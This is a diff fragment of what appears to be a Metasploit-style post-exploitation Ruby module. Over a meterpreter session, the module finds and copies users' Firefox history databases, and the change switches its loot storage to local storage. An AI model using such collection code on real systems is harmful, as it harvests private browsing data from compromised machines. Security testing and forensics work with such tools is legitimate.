@@ -152,13 +152,13 @@ def check_skype(path, user)
       file = cmd_exec("mdfind","-onlyin #{profile['dir']} -name places.sqlite").split("\n").collect {|p| if p =~ /Mozilla\Firefox\/\w.default\/places.sqlite$/; p; end }.compact
     end
 
-    file_loc = store_loot("firefox.history",
+# Using store_local instead of store_loot to attempt to preserve some semblance of forensic metadata.
+
+    file_loc = store_local("firefox.history",
         "binary/db",
         session,
-        "places.sqlite",
-        "Firefox History for User #{profile['UserName']} Profile"
-      )
-
+        "#{profile['UserName']}_places.sqlite"
+       )
     file.each do |db|
       if session.type =~ /meterpreter/
         maindb = "#{db['path']}#{session.fs.file.separator}#{db['name']}"
